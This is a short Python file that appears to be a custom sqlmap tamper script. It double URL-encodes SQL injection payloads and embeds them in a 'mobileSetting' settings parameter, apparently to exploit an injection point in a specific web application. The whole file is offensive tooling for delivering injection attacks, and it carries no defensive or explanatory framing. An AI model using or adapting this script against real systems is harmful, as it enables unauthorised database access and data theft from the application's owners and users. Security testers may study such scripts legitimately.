#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib.parse
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage

__priority__ = PRIORITY.NORMAL


def tamper(payload, **kwargs):
    payload1 = encode(payload)
    retVal = f"type=mobileSetting&timestamp=123&settings=[{{%22module%22:%222%22,%22setting%22:%22@{payload1}|1%22,%22modulename%22:%22111%22,%22scope%22:%22123%22}}]"
    retVal.encode("utf-8")
    return retVal
    
def encode(payload):
    encode_payload = urllib.parse.quote(urllib.parse.quote(payload))
    return encode_payload